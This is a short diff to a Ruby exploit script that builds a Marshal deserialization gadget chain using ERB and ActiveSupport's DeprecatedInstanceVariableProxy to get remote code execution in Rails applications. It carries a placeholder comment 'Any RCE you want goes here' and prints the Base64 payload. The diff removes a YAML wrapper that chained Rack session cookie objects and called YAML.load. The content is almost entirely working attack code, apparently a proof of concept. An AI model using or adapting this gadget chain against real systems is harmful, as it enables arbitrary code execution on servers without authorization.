@@ -17,6 +17,7 @@ class ActiveSupport
   end
 end
 
+# Any RCE you want goes here
 code = <<-EOS
 puts "pwned"
 EOS
@@ -29,23 +30,4 @@ depr = ActiveSupport::Deprecation::DeprecatedInstanceVariableProxy.new erb, :res
 
 payload = Base64.encode64(Marshal.dump(depr)).gsub("\n", "")
 
-payload = <<-PAYLOAD
----
-!ruby/object:Gem::Requirement
-requirements:
-  !ruby/object:Rack::Session::Abstract::SessionHash
-    req: !ruby/object:Rack::Request
-      env:
-        "rack.session": !ruby/object:Rack::Session::Abstract::SessionHash
-          id: 'hi from espr'
-        HTTP_COOKIE: "a=#{payload}"
-    store: !ruby/object:Rack::Session::Cookie
-      coder: !ruby/object:Rack::Session::Cookie::Base64::Marshal {}
-      key: a
-      secrets: []
-    exists: true
-    loaded: false
-PAYLOAD
-
 puts payload
-YAML.load(payload)
